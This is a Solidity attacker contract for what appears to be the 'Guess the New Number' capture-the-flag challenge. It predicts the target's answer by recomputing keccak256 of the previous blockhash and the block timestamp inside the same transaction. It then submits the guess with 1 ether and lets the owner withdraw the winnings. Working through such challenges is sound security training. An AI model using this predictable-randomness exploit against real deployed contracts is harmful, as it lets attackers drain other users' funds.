pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

import "hardhat/console.sol";

interface IGuessTheNewNumberChallenge {
    function isComplete() external view returns (bool);
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberChallengeAttacker {

    address owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function attack(address addr) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        console.log("GuessTheNewNumberChallengeAttacker answer:", answer);

        IGuessTheNewNumberChallenge challenge = IGuessTheNewNumberChallenge(addr);
        challenge.guess{value: 1 ether}(answer);
        require(challenge.isComplete(), "Challenge failed.");
        require(address(this).balance == 2 ether, "Account should contain 2 eth.");
    }

    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw.");
        bool success;
        (success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }
}
